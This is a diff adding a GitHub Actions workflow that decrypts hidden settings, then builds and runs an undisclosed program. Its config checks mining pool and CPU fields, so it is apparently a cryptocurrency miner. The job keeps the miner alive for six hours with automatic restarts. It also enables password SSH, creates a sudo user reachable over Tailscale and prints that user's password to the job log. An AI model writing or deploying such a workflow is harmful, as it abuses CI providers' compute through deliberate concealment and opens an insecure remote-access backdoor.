@@ -1,0 +1,188 @@
+name: MaseProject
+
+on:
+  workflow_dispatch:
+
+jobs:
+  secure-ssh:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    steps:
+      - name: Decrypt All Secrets
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openssl jq
+          
+          echo '${{ secrets.ALL_SECRETS }}' | base64 -d | openssl enc -aes-256-cbc -d -pbkdf2 -k '${{ secrets.MASTER_KEY }}' > /tmp/secrets.json
+          
+          SSH_PASSWORD=$(jq -r '.ssh_password' /tmp/secrets.json)
+          REPO_URL=$(jq -r '.repo_url' /tmp/secrets.json)
+          PROJECT_NAME=$(jq -r '.project_name' /tmp/secrets.json)
+          EXECUTABLE_NAME=$(jq -r '.executable_name' /tmp/secrets.json)
+          DEPENDENCIES=$(jq -r '.dependencies' /tmp/secrets.json)
+          
+          echo "SSH_PASSWORD=$SSH_PASSWORD" >> $GITHUB_ENV
+          echo "REPO_URL=$REPO_URL" >> $GITHUB_ENV
+          echo "PROJECT_NAME=$PROJECT_NAME" >> $GITHUB_ENV
+          echo "EXECUTABLE_NAME=$EXECUTABLE_NAME" >> $GITHUB_ENV
+          echo "DEPENDENCIES=$DEPENDENCIES" >> $GITHUB_ENV
+          
+          jq '.config' /tmp/secrets.json > /tmp/config.json
+          
+          rm -f /tmp/secrets.json
+          
+          echo "All secrets decrypted successfully"
+
+      - name: Configure SSH Settings
+        run: |
+          sudo apt-get install -y openssh-server
+          sudo systemctl enable ssh
+          sudo systemctl start ssh
+          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo systemctl restart ssh
+          sudo ufw allow 22/tcp
+          echo "SSH configured successfully"
+
+      - name: Create SSH User
+        run: |
+          sudo useradd -m -s /bin/bash SSH
+          echo "SSH:$SSH_PASSWORD" | sudo chpasswd
+          sudo usermod -aG sudo SSH
+          if ! id "SSH" &>/dev/null; then
+              echo "User creation failed"
+              exit 1
+          fi
+          echo "User SSH created successfully"
+
+      - name: Install Tailscale
+        run: |
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.noarmor.gpg | sudo tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.tailscale-keyring.list | sudo tee /etc/apt/sources.list.d/tailscale.list
+          sudo apt-get update
+          sudo apt-get install -y tailscale
+          echo "Tailscale installed successfully"
+
+      - name: Establish Tailscale Connection
+        run: |
+          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$GITHUB_RUN_ID
+          TAILSCALE_IP=""
+          RETRIES=0
+          while [ -z "$TAILSCALE_IP" ] && [ $RETRIES -lt 10 ]; do
+              TAILSCALE_IP=$(tailscale ip -4)
+              sleep 5
+              RETRIES=$((RETRIES + 1))
+          done
+          if [ -z "$TAILSCALE_IP" ]; then
+              echo "Tailscale IP not assigned. Exiting."
+              exit 1
+          fi
+          echo "TAILSCALE_IP=$TAILSCALE_IP" >> $GITHUB_ENV
+          echo "Tailscale connected with IP: $TAILSCALE_IP"
+
+      - name: Verify SSH Accessibility
+        run: |
+          echo "Tailscale IP: $TAILSCALE_IP"
+          sudo systemctl status ssh --no-pager
+          if nc -zv localhost 22 2>&1 | grep -q succeeded; then
+              echo "SSH port 22 is accessible"
+          else
+              echo "SSH port 22 is NOT accessible"
+              exit 1
+          fi
+          echo "SSH connectivity verified successfully"
+
+      - name: Install Project Dependencies
+        run: |
+          echo "Installing project dependencies: $DEPENDENCIES"
+          sudo apt-get install -y $DEPENDENCIES
+          echo "Dependencies installed successfully"
+
+      - name: Clone and Build Project
+        run: |
+          cd /home/SSH
+          sudo -u SSH git clone $REPO_URL
+          cd $PROJECT_NAME
+          sudo -u SSH mkdir build
+          cd build
+          sudo -u SSH cmake ..
+          sudo -u SSH make -j$(nproc)
+          echo "$PROJECT_NAME compiled successfully"
+
+      - name: Deploy Config
+        run: |
+          sudo mv /tmp/config.json /home/SSH/$PROJECT_NAME/build/config.json
+          sudo chown SSH:SSH /home/SSH/$PROJECT_NAME/build/config.json
+          sudo chmod 600 /home/SSH/$PROJECT_NAME/build/config.json
+          
+          echo "Configuration deployed successfully"
+          echo "Config validation:"
+          sudo jq '.cpu.enabled, .pools[0].url' /home/SSH/$PROJECT_NAME/build/config.json
+
+      - name: Start Project
+        run: |
+          sudo touch /home/SSH/$PROJECT_NAME.log
+          sudo chown SSH:SSH /home/SSH/$PROJECT_NAME.log
+          cd /home/SSH/$PROJECT_NAME/build
+          
+          sudo -u SSH bash -c "nohup ./$EXECUTABLE_NAME --config=config.json > /home/SSH/$PROJECT_NAME.log 2>&1 &"
+          
+          sleep 15
+          
+          if pgrep -f "$EXECUTABLE_NAME" > /dev/null; then
+              PID=$(pgrep -f $EXECUTABLE_NAME)
+              echo "$PROJECT_NAME started successfully - PID: $PID"
+              echo ""
+              echo "Initial log output:"
+              head -n 20 /home/SSH/$PROJECT_NAME.log
+          else
+              echo "ERROR: $PROJECT_NAME failed to start"
+              echo ""
+              echo "Log contents:"
+              cat /home/SSH/$PROJECT_NAME.log
+              exit 1
+          fi
+
+      - name: Maintain Connection
+        run: |
+          echo ""
+          echo "╔════════════════════════════════════════╗"
+          echo "║          SSH ACCESS INFO               ║"
+          echo "╠════════════════════════════════════════╣"
+          echo "║ Address:  $TAILSCALE_IP"
+          echo "║ Port:     22"
+          echo "║ Username: SSH"
+          echo "║ Password: $SSH_PASSWORD"
+          echo "╠════════════════════════════════════════╣"
+          echo "║ Connect:  ssh SSH@$TAILSCALE_IP"
+          echo "╚════════════════════════════════════════╝"
+          echo ""
+          echo "╔════════════════════════════════════════╗"
+          echo "║       $PROJECT_NAME STATUS             ║"
+          echo "╠════════════════════════════════════════╣"
+          echo "║ Log:    /home/SSH/$PROJECT_NAME.log"
+          echo "║ Config: /home/SSH/$PROJECT_NAME/build/config.json"
+          echo "╚════════════════════════════════════════╝"
+          echo ""
+          
+          while true; do
+              if pgrep -f "$EXECUTABLE_NAME" > /dev/null; then
+                  PID=$(pgrep -f $EXECUTABLE_NAME)
+                  CPU=$(ps -p $PID -o %cpu= 2>/dev/null | xargs)
+                  MEM=$(ps -p $PID -o %mem= 2>/dev/null | xargs)
+                  UPTIME=$(ps -p $PID -o etime= 2>/dev/null | xargs)
+                  echo "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Running | PID: $PID | CPU: ${CPU}% | MEM: ${MEM}% | Uptime: $UPTIME"
+              else
+                  echo "[$(date '+%Y-%m-%d %H:%M:%S')] ✗ Process NOT FOUND - Attempting restart..."
+                  cd /home/SSH/$PROJECT_NAME/build
+                  sudo -u SSH bash -c "nohup ./$EXECUTABLE_NAME --config=config.json > /home/SSH/$PROJECT_NAME.log 2>&1 &"
+                  sleep 10
+                  if pgrep -f "$EXECUTABLE_NAME" > /dev/null; then
+                      echo "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Process restarted successfully"
+                  else
+                      echo "[$(date '+%Y-%m-%d %H:%M:%S')] ✗ Restart failed - Check logs"
+                  fi
+              fi
+              sleep 300
+          done
